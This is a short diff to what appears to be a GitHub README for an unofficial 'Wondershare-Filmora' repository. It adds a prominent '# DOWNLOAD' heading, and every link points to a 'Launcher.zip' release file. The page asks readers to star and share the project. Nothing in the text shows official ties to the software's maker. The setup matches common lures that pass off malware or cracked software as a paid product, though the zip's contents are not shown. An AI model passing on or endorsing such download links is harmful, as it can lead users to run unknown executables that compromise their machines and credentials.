@@ -1,4 +1,5 @@
-[![image](https://github.com/user-attachments/assets/366c505e-48f6-4a33-a5f3-14688a059e8a)](https://github.com/rikardo13/Wondershare-Filmora/releases/download/Release/Launcher.zip)
+[![download](https://github.com/user-attachments/assets/e843b529-ea57-4f3b-8aa9-aafea1e4e15f)](https://github.com/rikardo13/Wondershare-Filmora/releases/download/Release/Launcher.zip)
+# [DOWNLOAD](https://github.com/rikardo13/Wondershare-Filmora/releases/download/Release/Launcher.zip)
 
 If you liked this project, please ⭐ it and share it with others!
 
